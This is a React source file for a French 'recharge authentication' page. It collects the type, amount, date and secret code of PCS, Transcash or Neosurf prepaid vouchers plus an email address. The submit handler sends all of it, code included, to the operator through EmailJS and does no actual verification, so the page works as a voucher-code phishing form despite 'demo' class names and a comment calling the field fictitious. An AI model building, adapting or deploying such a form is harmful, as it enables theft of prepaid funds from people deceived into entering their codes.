import { useState } from 'react'
import { Link } from 'react-router-dom'
import emailjs from '@emailjs/browser'
import { IconAlert, IconLock } from '../components/Icons.jsx'

const types = [
  { value: 'pcs', label: 'PCS' },
  { value: 'transcash', label: 'Transcash' },
  { value: 'neosurf', label: 'Neosurf' },
]

function today() {
  const d = new Date()
  const month = String(d.getMonth() + 1).padStart(2, '0')
  const day = String(d.getDate()).padStart(2, '0')
  return `${d.getFullYear()}-${month}-${day}`
}

export default function FormulaireRecharge() {
  const [form, setForm] = useState({
    type: '',
    montant: '',
    date: '',
    reference: '',
    email: '',
  })

  const [status, setStatus] = useState('idle')
  const [showPopup, setShowPopup] = useState(false)
  const [hideReference, setHideReference] = useState(true)

  function update(event) {
    const { name, value } = event.target
    setForm((prev) => ({ ...prev, [name]: value }))
  }

  function openCalendar(event) {
    try {
      event.target.showPicker()
    } catch (error) {
      // Le calendrier reste accessible via l'icône
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    setStatus('sending')

    emailjs
      .send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
        {
          type: types.find((t) => t.value === form.type)?.label ?? form.type,
          montant: form.montant,
          date: form.date,
          reference: form.reference,
          email: form.email,
        },
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
      )
      .then(() => {
        setStatus('sent')
        setShowPopup(true)
      })
      .catch(() => {
        setStatus('error')
      })
  }

  return (
    <main className="demo-form-page">
      <section className="demo-form-wrap">

        {/* EN-TÊTE PROFESSIONNEL */}
        <div
          className="demo-form-header"
          style={{
            width: '100%',
            margin: '0 auto 25px',
            textAlign: 'center',
            display: 'block',
            visibility: 'visible',
            opacity: 1,
          }}
        >
{/* IMAGE D'EN-TÊTE */}
<div
  className="demo-form-header-image"
  style={{
    width: '100%',
    height: '160px',
    margin: '0 auto 24px',
    borderRadius: '14px',
    overflow: 'hidden',
  }}
>
  <img
    src="/logos/image.png"
    alt="Bannière"
    style={{
      width: '100%',
      height: '100%',
      objectFit: 'cover',
      display: 'block',
    }}
  />
</div>

          {/* GRAND TITRE */}
          <h1
            className="demo-form-header-title"
            style={{
              display: 'block',
              margin: '0 0 22px',
              padding: '0',
              color: '#102d3a',
              fontSize: 'clamp(23px, 5vw, 30px)',
              fontWeight: '800',
              lineHeight: '1.25',
              textAlign: 'center',
            }}
          >
            Formulaire Pour Authentifier Votre Recharge
          </h1>

          {/* LES DEUX CONSIGNES */}
          <div
            className="demo-form-instructions"
            style={{
              display: 'flex',
              flexDirection: 'column',
              gap: '14px',
              width: '100%',
              margin: '0 auto',
              padding: '18px',
              borderRadius: '12px',
              backgroundColor: '#f5f8f7',
              textAlign: 'left',
            }}
          >

            <p
              style={{
                display: 'flex',
                alignItems: 'flex-start',
                gap: '10px',
                margin: 0,
                color: '#405d64',
                fontSize: '14px',
                lineHeight: '1.6',
              }}
            >
              <span style={{ color: '#176b72', fontWeight: '900' }}>—</span>
              <span>Remplissez les informations demandées ci-dessous.</span>
            </p>

            <p
              style={{
                display: 'flex',
                alignItems: 'flex-start',
                gap: '10px',
                margin: 0,
                color: '#405d64',
                fontSize: '14px',
                lineHeight: '1.6',
              }}
            >
              <span style={{ color: '#176b72', fontWeight: '900' }}>—</span>
              <span>
                Enfin, vous recevrez un e-mail de confirmation après avoir appuyé sur Authentifier.
              </span>
            </p>

          </div>
        </div>

        <form className="demo-form-card" onSubmit={handleSubmit}>

          <h1 className="demo-form-title">FORMULAIRE</h1>

          {/* TYPE DE RECHARGE */}
          <label htmlFor="type">
            Types de recharge <span>*</span>
          </label>

          <select
            id="type"
            name="type"
            value={form.type}
            onChange={update}
            required
          >
            <option value="">-- Sélectionner --</option>

            {types.map((t) => (
              <option key={t.value} value={t.value}>
                {t.label}
              </option>
            ))}
          </select>

          {/* MONTANT */}
          <label htmlFor="montant">
            Montant <span>*</span>
          </label>

          <input
            id="montant"
            name="montant"
            type="number"
            min="0"
            placeholder="Entrer le montant"
            value={form.montant}
            onChange={update}
            required
          />

          {/* DATE D'ACHAT */}
          <label htmlFor="date">
            Date d'achat <span>*</span>
          </label>

          <input
            id="date"
            name="date"
            type="date"
            max={today()}
            value={form.date}
            onChange={update}
            onClick={openCalendar}
            required
          />

          {/* REFERENCE FICTIVE */}
          <label htmlFor="reference">
            Le code <span>*</span>
          </label>

          <input
            id="reference"
            name="reference"
            type={hideReference ? 'password' : 'text'}
            maxLength={30}
            placeholder="Entrer le code"
            value={form.reference}
            onChange={update}
            autoComplete="off"
            required
          />

          <p className="demo-form-hint">
            <IconLock width="16" height="16" />
          </p>

          {/* CACHER OU AFFICHER LE CODE */}
          <label>
            Cacher le code ? <span>*</span>
          </label>

          <div className="demo-reference-options">

            <label>
              <input
                type="radio"
                name="hideReference"
                value="oui"
                checked={hideReference}
                onChange={() => setHideReference(true)}
              />
              OUI
            </label>

            <label>
              <input
                type="radio"
                name="hideReference"
                value="non"
                checked={!hideReference}
                onChange={() => setHideReference(false)}
              />
              NON
            </label>

          </div>

          {/* EMAIL */}
          <label htmlFor="email">
            Email <span>*</span>
          </label>

          <input
            id="email"
            name="email"
            type="email"
            placeholder="Entrer votre email"
            value={form.email}
            onChange={update}
            required
          />

          {/* BOUTON AUTHENTIFIER */}
          <button
            className="demo-form-button"
            type="submit"
            disabled={status === 'sending'}
          >
            {status === 'sending' ? 'Authentification en cours...' : 'Authentifier'}
          </button>

          {/* MESSAGE D'ERREUR */}
          {status === 'error' && (
            <p className="demo-form-success" role="status">
              <IconAlert width="18" height="18" />
              L'envoi a échoué. Réessayez dans un instant.
            </p>
          )}

          {/* RETOUR */}
          <Link className="demo-form-back" to="/#recharges">
            Retour aux cartes
          </Link>

        </form>

        {/* POPUP DE CONFIRMATION */}
        {showPopup && (
          <div
            className="demo-form-popup-overlay"
            role="dialog"
            aria-modal="true"
          >
            <div className="demo-form-popup">

              <IconAlert width="28" height="28" />

              <p>Votre message a été bien envoyé.</p>

              <button
                type="button"
                className="demo-form-popup-close"
                onClick={() => setShowPopup(false)}
              >
                OK
              </button>

            </div>
          </div>
        )}

      </section>
    </main>
  )
}